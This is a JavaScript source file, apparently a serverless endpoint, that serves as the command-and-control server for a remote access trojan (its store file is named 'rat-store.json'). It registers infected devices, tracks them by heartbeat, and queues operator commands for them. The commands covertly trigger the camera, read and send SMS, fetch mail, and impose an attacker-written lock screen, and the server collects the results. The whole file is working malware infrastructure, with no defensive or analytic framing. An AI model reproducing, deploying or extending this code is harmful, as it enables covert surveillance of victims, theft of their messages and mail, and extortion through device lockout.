import fs from 'fs';

// ============================================================
// STORE — memory + /tmp persistence
// ============================================================
const store = {
  clients: new Map(),
  commands: new Map(),
  results: new Map(),
};

const STORE_FILE = '/tmp/rat-store.json';

function loadStore() {
  try {
    if (fs.existsSync(STORE_FILE)) {
      const raw = fs.readFileSync(STORE_FILE, 'utf8');
      const data = JSON.parse(raw);
      store.clients = new Map(Object.entries(data.clients || {}));
      store.commands = new Map(Object.entries(data.commands || {}));
      store.results = new Map(Object.entries(data.results || {}));
    }
  } catch (_) {}
}

function saveStore() {
  try {
    const data = {
      clients: Object.fromEntries(store.clients),
      commands: Object.fromEntries(store.commands),
      results: Object.fromEntries(store.results),
    };
    fs.writeFileSync(STORE_FILE, JSON.stringify(data), 'utf8');
  } catch (_) {}
}

loadStore();

// ============================================================
// HELPERS
// ============================================================
function generateId() {
  return 'c' + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
}

function cleanupStale() {
  const now = Date.now();
  for (const [id, client] of store.clients) {
    if (now - (client.lastSeen || 0) > 60000) {
      client.status = 'offline';
      store.clients.set(id, client);
    }
  }
  saveStore();
}
setInterval(cleanupStale, 15000);

// ============================================================
// MAIN HANDLER
// ============================================================
export default async function handler(req, res) {
  // CORS — allow all origins
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  const { action } = req.query;

  try {
    switch (action) {
      case 'clients': return getClients(req, res);
      case 'register': return registerClient(req, res);
      case 'heartbeat': return heartbeat(req, res);
      case 'poll': return pollCommands(req, res);
      case 'command': return sendCommand(req, res);
      case 'result': return postResult(req, res);
      case 'results': return getResults(req, res);
      case 'flash': return controlFlash(req, res);
      case 'camera': return triggerCamera(req, res);
      case 'lock': return setLock(req, res);
      case 'unlock': return unlock(req, res);
      case 'lcd': return setLcd(req, res);
      case 'sms': return getSms(req, res);
      case 'send_sms': return sendSms(req, res);
      case 'mail': return getMail(req, res);
      default:
        return res.status(400).json({ error: 'Invalid action: ' + action });
    }
  } catch (err) {
    console.error('[API ERROR]', err);
    return res.status(500).json({ error: err.message || 'Internal error' });
  }
}

// ============================================================
// CORE ENDPOINTS
// ============================================================

// GET /?action=clients
function getClients(req, res) {
  const list = [];
  for (const [id, data] of store.clients) {
    list.push({ id, ...data });
  }
  list.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
  return res.json(list);
}

// POST /?action=register
function registerClient(req, res) {
  const { clientId, hostname, os, battery = 0 } = req.body || {};
  const id = clientId || generateId();

  // Simpan client
  store.clients.set(id, {
    hostname: hostname || 'unknown',
    os: os || 'unknown',
    status: 'online',
    lastSeen: Date.now(),
    battery: parseInt(battery) || 0,
  });

  // Inisialisasi queue
  if (!store.commands.has(id)) store.commands.set(id, []);
  if (!store.results.has(id)) store.results.set(id, []);

  saveStore();

  console.log(`[REGISTER] ${id} - ${hostname} (${os})`);
  return res.json({ clientId: id, registered: true });
}

// POST /?action=heartbeat
function heartbeat(req, res) {
  const { clientId, battery } = req.body || {};
  if (!clientId) {
    return res.status(400).json({ error: 'clientId required' });
  }

  const client = store.clients.get(clientId);
  if (!client) {
    return res.status(404).json({ error: 'Client not registered' });
  }

  client.status = 'online';
  client.lastSeen = Date.now();
  if (battery !== undefined) client.battery = parseInt(battery);
  store.clients.set(clientId, client);
  saveStore();

  return res.json({ ok: true });
}

// POST /?action=poll
function pollCommands(req, res) {
  const { clientId, lastCommandId = 0 } = req.body || {};
  if (!clientId) {
    return res.status(400).json({ error: 'clientId required' });
  }

  const queue = store.commands.get(clientId) || [];
  
  // Ambil command baru (id > lastCommandId)
  const newCommands = queue.filter(cmd => cmd.id > parseInt(lastCommandId));

  // Hapus command lama (>120 detik)
  const now = Date.now();
  const keep = queue.filter(cmd => now - cmd.id < 120000);
  store.commands.set(clientId, keep);
  saveStore();

  return res.json({ commands: newCommands });
}

// POST /?action=command
function sendCommand(req, res) {
  const { clientId, command, params = {} } = req.body || {};
  
  if (!clientId || !command) {
    return res.status(400).json({ error: 'clientId and command required' });
  }

  const client = store.clients.get(clientId);
  if (!client) {
    return res.status(404).json({ error: 'Client not found' });
  }
  if (client.status !== 'online') {
    return res.status(400).json({ error: 'Client is offline' });
  }

  const cmdId = Date.now();
  const queue = store.commands.get(clientId) || [];
  queue.push({ id: cmdId, command, params });
  store.commands.set(clientId, queue);
  saveStore();

  console.log(`[COMMAND] ${clientId} -> ${command}`);
  return res.json({ commandId: cmdId, status: 'queued' });
}

// POST /?action=result
function postResult(req, res) {
  const { clientId, commandId, output, error = false } = req.body || {};
  
  if (!clientId || !commandId) {
    return res.status(400).json({ error: 'clientId and commandId required' });
  }

  const results = store.results.get(clientId) || [];
  results.push({
    commandId: parseInt(commandId),
    output: output || '(empty)',
    error: !!error,
    timestamp: Date.now(),
  });
  
  // Keep last 100
  if (results.length > 100) results.splice(0, results.length - 100);
  store.results.set(clientId, results);
  saveStore();

  return res.json({ ok: true });
}

// GET /?action=results&clientId=xxx&after=0
function getResults(req, res) {
  const { clientId, after = 0 } = req.query;
  if (!clientId) {
    return res.status(400).json({ error: 'clientId required' });
  }

  const results = store.results.get(clientId) || [];
  const filtered = results.filter(r => r.commandId > parseInt(after));
  filtered.sort((a, b) => a.commandId - b.commandId);

  return res.json(filtered);
}

// ============================================================
// FLASH
// ============================================================
function controlFlash(req, res) {
  const { clientId, action } = req.body || {};
  if (!clientId || !action) {
    return res.status(400).json({ error: 'clientId and action required' });
  }
  if (!['on', 'off', 'blink'].includes(action)) {
    return res.status(400).json({ error: 'Invalid action' });
  }

  const cmdId = Date.now();
  const queue = store.commands.get(clientId) || [];
  queue.push({ id: cmdId, command: 'flash', params: { action } });
  store.commands.set(clientId, queue);
  saveStore();

  return res.json({ commandId: cmdId, status: 'queued' });
}

// ============================================================
// CAMERA
// ============================================================
function triggerCamera(req, res) {
  const { clientId, camera = 'back' } = req.body || {};
  if (!clientId) {
    return res.status(400).json({ error: 'clientId required' });
  }

  const cmdId = Date.now();
  const queue = store.commands.get(clientId) || [];
  queue.push({ id: cmdId, command: 'camera', params: { camera } });
  store.commands.set(clientId, queue);
  saveStore();

  return res.json({ commandId: cmdId, status: 'queued' });
}

// ============================================================
// LOCK SCREEN
// ============================================================
function setLock(req, res) {
  const { clientId, html } = req.body || {};
  if (!clientId || !html) {
    return res.status(400).json({ error: 'clientId and html required' });
  }

  const cmdId = Date.now();
  const queue = store.commands.get(clientId) || [];
  queue.push({ id: cmdId, command: 'lock_screen', params: { html } });
  store.commands.set(clientId, queue);
  saveStore();

  return res.json({ commandId: cmdId, status: 'queued' });
}

function unlock(req, res) {
  const { clientId } = req.body || {};
  if (!clientId) {
    return res.status(400).json({ error: 'clientId required' });
  }

  const cmdId = Date.now();
  const queue = store.commands.get(clientId) || [];
  queue.push({ id: cmdId, command: 'unlock_screen', params: {} });
  store.commands.set(clientId, queue);
  saveStore();

  return res.json({ commandId: cmdId, status: 'queued' });
}

// ============================================================
// LCD EFFECT
// ============================================================
function setLcd(req, res) {
  const { clientId, effect } = req.body || {};
  if (!clientId || !effect) {
    return res.status(400).json({ error: 'clientId and effect required' });
  }

  const cmdId = Date.now();
  const queue = store.commands.get(clientId) || [];
  queue.push({ id: cmdId, command: 'lcd_effect', params: { effect } });
  store.commands.set(clientId, queue);
  saveStore();

  return res.json({ commandId: cmdId, status: 'queued' });
}

// ============================================================
// SMS
// ============================================================
function getSms(req, res) {
  const { clientId } = req.query;
  if (!clientId) {
    return res.status(400).json({ error: 'clientId required' });
  }

  const cmdId = Date.now();
  const queue = store.commands.get(clientId) || [];
  queue.push({ id: cmdId, command: 'fetch_sms', params: {} });
  store.commands.set(clientId, queue);
  saveStore();

  return res.json({ commandId: cmdId, status: 'queued' });
}

function sendSms(req, res) {
  const { clientId, to, body } = req.body || {};
  if (!clientId || !to || !body) {
    return res.status(400).json({ error: 'clientId, to, body required' });
  }

  const cmdId = Date.now();
  const queue = store.commands.get(clientId) || [];
  queue.push({ id: cmdId, command: 'send_sms', params: { to, body } });
  store.commands.set(clientId, queue);
  saveStore();

  return res.json({ commandId: cmdId, status: 'queued' });
}

// ============================================================
// MAIL
// ============================================================
function getMail(req, res) {
  const { clientId } = req.query;
  if (!clientId) {
    return res.status(400).json({ error: 'clientId required' });
  }

  const cmdId = Date.now();
  const queue = store.commands.get(clientId) || [];
  queue.push({ id: cmdId, command: 'fetch_mail', params: {} });
  store.commands.set(clientId, queue);
  saveStore();

  return res.json({ commandId: cmdId, status: 'queued' });
}
